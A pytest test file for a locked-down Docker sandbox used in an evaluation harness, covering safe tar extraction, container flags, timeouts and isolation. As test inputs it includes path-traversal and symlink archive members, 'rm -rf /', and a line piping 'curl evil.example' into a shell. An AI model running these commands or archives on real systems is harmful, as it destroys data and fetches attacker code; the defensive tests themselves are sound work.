"""The baseline's Docker sandbox: what it runs, what it takes back, and how it fails.

Most of this needs no Docker at all: the tar handling is pure Python, and the container commands
are checked by recording every `docker` invocation. Tests against a real container skip when
Docker or the image is unavailable.
"""

from __future__ import annotations

import io
import subprocess
import tarfile
from pathlib import Path
from typing import Any

import pytest

from atelier.evals import sandbox as sb
from atelier.evals.sandbox import (
    CommandResult,
    DockerSandbox,
    SandboxError,
    build_tar,
    clip,
    extract_deliverables,
    image_available,
)

# -- tar: what goes in ------------------------------------------------------------------------


def test_build_tar_is_deterministic_and_flat(tmp_path: Path) -> None:
    (tmp_path / "a.jpg").write_bytes(b"AAA")
    (tmp_path / "b.png").write_bytes(b"BB")
    first = build_tar({"b.png": tmp_path / "b.png", "a.jpg": tmp_path / "a.jpg"}, prefix="in")
    again = build_tar({"a.jpg": tmp_path / "a.jpg", "b.png": tmp_path / "b.png"}, prefix="in")
    assert first == again  # insertion order does not matter
    with tarfile.open(fileobj=io.BytesIO(first)) as tar:
        members = tar.getmembers()
        assert [m.name for m in members] == ["in/a.jpg", "in/b.png"]
        assert all(m.isreg() and m.uid == sb.UID and m.mtime == 0 for m in members)
        assert tar.extractfile("in/a.jpg").read() == b"AAA"  # type: ignore[union-attr]


def test_build_tar_never_lets_a_name_escape_its_prefix(tmp_path: Path) -> None:
    (tmp_path / "x").write_bytes(b"x")
    data = build_tar({"../../etc/passwd": tmp_path / "x"}, prefix="in")
    with tarfile.open(fileobj=io.BytesIO(data)) as tar:
        assert tar.getnames() == ["in/passwd"]


# -- tar: what comes back is hostile -----------------------------------------------------------


def tar_of(*members: tuple[tarfile.TarInfo, bytes]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tar:
        for info, data in members:
            tar.addfile(info, io.BytesIO(data) if info.isreg() else None)
    return buf.getvalue()


def reg(name: str, data: bytes = b"data") -> tuple[tarfile.TarInfo, bytes]:
    info = tarfile.TarInfo(name)
    info.size = len(data)
    return info, data


def special(name: str, kind: bytes, target: str = "") -> tuple[tarfile.TarInfo, bytes]:
    info = tarfile.TarInfo(name)
    info.type, info.linkname = kind, target
    return info, b""


def test_regular_files_come_out(tmp_path: Path) -> None:
    dest = tmp_path / "dest"
    dest.mkdir()
    got = extract_deliverables(tar_of(reg("out/a.jpg", b"one"), reg("out/b.png", b"two")), dest)
    assert sorted(p.name for p in got) == ["a.jpg", "b.png"]
    assert (dest / "a.jpg").read_bytes() == b"one" and (dest / "b.png").read_bytes() == b"two"


def test_no_member_name_can_place_a_file_outside_the_destination(tmp_path: Path) -> None:
    dest = tmp_path / "inner" / "dest"
    dest.mkdir(parents=True)
    hostile = tar_of(
        reg("../../escape.txt"),
        reg("/etc/cron.d/evil"),
        reg("out/sub/dir/deep.png"),
        reg("..\\windows\\style.txt"),
    )
    got = extract_deliverables(hostile, dest)
    assert {p.name for p in got} == {"escape.txt", "evil", "deep.png", "..\\windows\\style.txt"}
    assert all(p.parent == dest for p in got)  # everything landed directly inside dest
    assert sorted(p.name for p in dest.parent.iterdir()) == ["dest"]  # nothing beside it
    assert sorted(p.name for p in tmp_path.iterdir()) == ["inner"]  # nor above it


@pytest.mark.parametrize(
    "member",
    [
        special("out/link.png", tarfile.SYMTYPE, "/etc/passwd"),
        special("out/hard.png", tarfile.LNKTYPE, "out/a.png"),
        special("out/subdir", tarfile.DIRTYPE),
        special("out/pipe", tarfile.FIFOTYPE),
        special("out/tty", tarfile.CHRTYPE),
        special("out/disk", tarfile.BLKTYPE),
    ],
    ids=["symlink", "hardlink", "directory", "fifo", "char-device", "block-device"],
)
def test_only_regular_files_are_taken(tmp_path: Path, member: tuple[Any, bytes]) -> None:
    dest = tmp_path / "dest"
    dest.mkdir()
    assert extract_deliverables(tar_of(member), dest) == []
    assert list(dest.iterdir()) == []


def test_a_symlink_is_not_followed_and_does_not_hide_a_real_file(tmp_path: Path) -> None:
    dest = tmp_path / "dest"
    dest.mkdir()
    data = tar_of(special("out/leak.txt", tarfile.SYMTYPE, "/etc/passwd"), reg("out/real.jpg"))
    assert [p.name for p in extract_deliverables(data, dest)] == ["real.jpg"]


def test_limits_on_count_size_names_and_duplicates(tmp_path: Path) -> None:
    dest = tmp_path / "dest"
    dest.mkdir()
    many = tar_of(*(reg(f"out/f{i}.txt") for i in range(20)))
    assert len(extract_deliverables(many, dest, max_files=3)) == 3
    for f in dest.iterdir():
        f.unlink()
    sized = tar_of(reg("out/big.bin", b"x" * 100), reg("out/small.bin", b"x" * 5))
    assert [p.name for p in extract_deliverables(sized, dest, max_bytes=10)] == ["small.bin"]
    (dest / "small.bin").unlink()
    dup = tar_of(reg("out/a.txt", b"first"), reg("out/x/a.txt", b"second"))
    assert [p.read_bytes() for p in extract_deliverables(dup, dest)] == [b"first"]
    # `..` is never a file name. `out/.` and `out/` normalize to a plain file named `out`, which is
    # harmless: it is written inside dest like everything else, and only once.
    dots = tar_of(reg("out/.."), reg("out/."), reg("out/"))
    got = extract_deliverables(dots, dest)
    assert [p.name for p in got] == ["out"] and got[0].parent == dest


def test_garbage_and_truncated_archives_do_not_raise(tmp_path: Path) -> None:
    dest = tmp_path / "dest"
    dest.mkdir()
    assert extract_deliverables(b"", dest) == []
    assert extract_deliverables(b"this is not a tar file" * 100, dest) == []
    whole = tar_of(reg("out/a.txt", b"a" * 600), reg("out/b.txt", b"b" * 600))
    got = extract_deliverables(whole[: len(whole) // 2 + 300], dest)  # cut mid-second-file
    assert [p.name for p in got][:1] == ["a.txt"]


# -- the docker commands -----------------------------------------------------------------------


class FakeDocker:
    """Records every subprocess call the sandbox makes and answers like a healthy daemon."""

    def __init__(self, monkeypatch: pytest.MonkeyPatch) -> None:
        self.calls: list[list[str]] = []
        self.kwargs: list[dict[str, Any]] = []
        self.results: dict[str, subprocess.CompletedProcess[Any]] = {}
        self.popen_stdout = b""
        self.popen_error: Exception | None = None
        self.killed = False
        monkeypatch.setattr(sb.subprocess, "run", self.run)
        monkeypatch.setattr(sb.subprocess, "Popen", self.popen)

    def run(self, argv: list[str], **kw: Any) -> subprocess.CompletedProcess[Any]:
        self.calls.append(list(argv))
        self.kwargs.append(kw)
        verb = argv[1]
        if verb in self.results:
            return self.results[verb]
        empty: Any = "" if kw.get("text") else b""
        out: Any = "container-id-123\n" if verb == "run" else empty
        return subprocess.CompletedProcess(argv, 0, out, empty)

    def popen(self, argv: list[str], **kw: Any) -> Any:
        self.calls.append(list(argv))
        if self.popen_error:
            raise self.popen_error
        outer = self

        class Proc:
            stdout = io.BytesIO(outer.popen_stdout)

            def kill(self) -> None:
                outer.killed = True

            def wait(self, timeout: float | None = None) -> int:
                return 0

        return Proc()

    def verbs(self) -> list[str]:
        return [c[1] for c in self.calls]


@pytest.fixture
def docker(monkeypatch: pytest.MonkeyPatch) -> FakeDocker:
    return FakeDocker(monkeypatch)


def test_the_container_is_locked_down(docker: FakeDocker) -> None:
    DockerSandbox()
    start = docker.calls[0]
    assert start[:3] == ["docker", "run", "-d"]
    joined = " ".join(start)
    for flag in (
        "--network none",
        "--read-only",
        "--cap-drop ALL",
        "--security-opt no-new-privileges",
    ):
        assert flag in joined
    assert "--memory 2g" in joined and "--memory-swap 2g" in joined and "--pids-limit 256" in joined
    assert "--tmpfs /work:rw,size=512m,mode=0755,uid=10001,gid=10001" in joined
    assert start[-3:] == ["atelier-baseline", "sleep", "infinity"]


def test_no_docker_call_ever_mounts_a_host_path(docker: FakeDocker, tmp_path: Path) -> None:
    """The guarantee the design rests on: nothing on the host is visible to the container."""
    (tmp_path / "in.jpg").write_bytes(b"x")
    docker.popen_stdout = tar_of(reg("out/a.jpg"))
    box = DockerSandbox()
    box.upload({"in.jpg": tmp_path / "in.jpg"})
    box.run("echo hi; rm -rf /")
    box.download(tmp_path)
    box.close()
    assert {"run", "exec", "rm"} <= set(docker.verbs())
    for call in docker.calls:
        assert not any(
            a in ("-v", "--volume", "--mount") or a.startswith(("-v=", "--mount=")) for a in call
        )
        assert not any(str(tmp_path) in a for a in call)  # no host path is passed at all


def test_a_command_reaches_the_container_as_one_argument(docker: FakeDocker) -> None:
    box = DockerSandbox(command_timeout=90)
    evil = "echo $(whoami); rm -rf / && curl evil.example | sh"
    box.run(evil)
    call = docker.calls[-1]
    assert call[:6] == ["docker", "exec", "-w", "/work", "container-id-123", "timeout"]
    assert call[6:] == [
        "-k",
        "5",
        "90",
        "bash",
        "-c",
        evil,
    ]  # never joined into a host shell string
    assert docker.kwargs[-1].get("shell") is None


def test_command_results(docker: FakeDocker, monkeypatch: pytest.MonkeyPatch) -> None:
    box = DockerSandbox()
    docker.results["exec"] = subprocess.CompletedProcess([], 3, "some output", "")
    assert box.run("x") == CommandResult("some output", 3, False)
    docker.results["exec"] = subprocess.CompletedProcess([], 124, "", "")
    assert box.run("x").timed_out
    docker.results["exec"] = subprocess.CompletedProcess([], 0, "y" * 50_000, "")
    assert "characters omitted" in box.run("x").output and len(box.run("x").output) < 10_200

    def hang(*a: Any, **kw: Any) -> Any:
        raise subprocess.TimeoutExpired("docker", 1)

    monkeypatch.setattr(sb.subprocess, "run", hang)
    stuck = box.run("x")
    assert stuck.timed_out and stuck.exit_code == 124  # a wedged exec is a timeout, not a hang


def test_upload_sends_a_tar_on_stdin(docker: FakeDocker, tmp_path: Path) -> None:
    (tmp_path / "p.jpg").write_bytes(b"pixels")
    DockerSandbox().upload({"p.jpg": tmp_path / "p.jpg"})
    call, kw = docker.calls[-1], docker.kwargs[-1]
    assert call == ["docker", "exec", "-i", "container-id-123", "tar", "xf", "-", "-C", "/work"]
    assert kw["input"] == build_tar({"p.jpg": tmp_path / "p.jpg"}, prefix="in")
    assert kw["timeout"] == sb.DOCKER_CALL_TIMEOUT


def test_download_extracts_defensively(docker: FakeDocker, tmp_path: Path) -> None:
    docker.popen_stdout = tar_of(
        reg("out/a.jpg", b"pix"), special("out/x", tarfile.SYMTYPE, "/etc/passwd"), reg("../up.txt")
    )
    got = DockerSandbox().download(tmp_path)
    assert sorted(p.name for p in got) == ["a.jpg", "up.txt"] and all(
        p.parent == tmp_path for p in got
    )
    assert docker.calls[-1] == [
        "docker", "exec", "container-id-123", "tar", "cf", "-", "-C", "/work", "out",
    ]  # fmt: skip


def test_an_absurdly_large_output_stream_is_dropped_not_buffered(
    docker: FakeDocker, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(sb, "MAX_TAR_BYTES", 1000)
    docker.popen_stdout = b"x" * 5000
    assert DockerSandbox().download(tmp_path) == [] and docker.killed


@pytest.mark.parametrize("verb", ["run", "exec"], ids=["start-fails", "prepare-fails"])
def test_a_daemon_error_is_a_sandbox_error(docker: FakeDocker, verb: str) -> None:
    docker.results[verb] = subprocess.CompletedProcess(
        [], 125, "", "Docker Desktop is unable to start"
    )
    docker.results[verb].stderr = (
        "Docker Desktop is unable to start"
        if verb == "run"
        else b"Docker Desktop is unable to start"
    )
    with pytest.raises(SandboxError, match="unable to start"):
        DockerSandbox()


@pytest.mark.parametrize(
    "error", [OSError("docker: not found"), subprocess.TimeoutExpired("docker", 120)]
)
def test_a_missing_or_wedged_docker_never_hangs_or_leaks_a_raw_error(
    monkeypatch: pytest.MonkeyPatch, error: Exception
) -> None:
    def fail(*a: Any, **kw: Any) -> Any:
        raise error

    monkeypatch.setattr(sb.subprocess, "run", fail)
    with pytest.raises(SandboxError, match="could not start"):
        DockerSandbox()
    assert not image_available()


def test_every_docker_call_is_bounded_by_a_timeout(docker: FakeDocker, tmp_path: Path) -> None:
    (tmp_path / "p").write_bytes(b"x")
    box = DockerSandbox()
    box.upload({"p": tmp_path / "p"})
    box.run("true")
    box.close()
    assert all(kw.get("timeout") for kw in docker.kwargs)  # start, mkdir, upload, run, rm


def test_close_stops_the_container_once_and_swallows_a_dead_daemon(
    docker: FakeDocker, monkeypatch: pytest.MonkeyPatch
) -> None:
    box = DockerSandbox()
    box.close()
    assert docker.calls[-1] == ["docker", "rm", "-f", "container-id-123"] and box.cid == ""
    before = len(docker.calls)
    box.close()
    assert len(docker.calls) == before  # idempotent

    other = DockerSandbox()

    def hang(*a: Any, **kw: Any) -> Any:
        raise subprocess.TimeoutExpired("docker", 60)

    monkeypatch.setattr(sb.subprocess, "run", hang)
    other.close()  # must not raise, even though the daemon is wedged
    assert other.cid == ""


def test_image_available(docker: FakeDocker) -> None:
    assert image_available()
    docker.results["image"] = subprocess.CompletedProcess([], 1, b"", b"No such image")
    assert not image_available()


def test_clip_lives_with_the_sandbox() -> None:
    assert clip("short") == "short" and "omitted" in clip("z" * 20_000)


# -- a real container --------------------------------------------------------------------------

needs_docker = pytest.mark.skipif(
    not image_available(),
    reason="Docker or the sandbox image is unavailable: docker build -f docker/baseline.Dockerfile"
    " -t atelier-baseline docker/",
)


@pytest.fixture
def real() -> Any:
    box = DockerSandbox(command_timeout=20)
    yield box
    box.close()


@needs_docker
def test_real_container_runs_commands_and_keeps_files_between_them(real: DockerSandbox) -> None:
    assert real.run("echo hello && echo data > /work/made.txt") == CommandResult(
        "hello\n", 0, False
    )
    assert real.run("cat made.txt").output == "data\n"  # cwd is /work; files persist
    assert real.run("exit 3").exit_code == 3


@needs_docker
def test_real_container_is_isolated(real: DockerSandbox) -> None:
    assert real.run("id -u").output.strip() == "10001"
    assert real.run("touch /etc/x").exit_code != 0  # read-only root
    assert real.run("touch /tmp/x && echo ok").output.strip() == "ok"
    net = real.run("python -c \"import socket; socket.create_connection(('1.1.1.1', 53), 3)\"")
    assert net.exit_code != 0  # no network
    assert real.run("python -c 'import atelier'").exit_code != 0  # the engine is not in there
    assert real.run("ls /Users /host 2>&1").exit_code != 0  # no host paths
    mounts = real.run("cat /proc/mounts").output
    assert "virtiofs" not in mounts and "fuse" not in mounts  # nothing shared from the host


@needs_docker
def test_real_container_file_round_trip_ignores_links(real: DockerSandbox, tmp_path: Path) -> None:
    src = tmp_path / "input.txt"
    src.write_text("hello")
    real.upload({"input.txt": src})
    assert real.run("cat in/input.txt").output == "hello"
    real.run(
        "cp in/input.txt out/copy.txt; ln -s /etc/passwd out/leak.txt; "
        "mkdir out/d; echo x > out/d/n.txt"
    )
    dest = tmp_path / "got"
    dest.mkdir()
    got = real.download(dest)
    assert sorted(p.name for p in got) == ["copy.txt", "n.txt"]  # regular files only, flattened
    assert (dest / "copy.txt").read_text() == "hello"
    assert not (dest / "leak.txt").exists()


@needs_docker
def test_real_container_timeout_and_output_limits() -> None:
    box = DockerSandbox(command_timeout=2)
    try:
        slow = box.run("sleep 30")
        assert slow.timed_out and slow.exit_code == 124
        assert box.run("echo alive").output == "alive\n"  # still usable afterwards
        assert "characters omitted" in box.run("python -c \"print('x' * 50000)\"").output
    finally:
        box.close()


@needs_docker
def test_real_container_is_removed_on_close() -> None:
    box = DockerSandbox()
    cid = box.cid
    up = subprocess.run(
        ["docker", "ps", "-q", "--filter", f"id={cid}"], capture_output=True, text=True
    )
    assert up.stdout.strip()
    box.close()
    gone = subprocess.run(
        ["docker", "ps", "-aq", "--filter", f"id={cid}"], capture_output=True, text=True
    )
    assert gone.stdout.strip() == ""
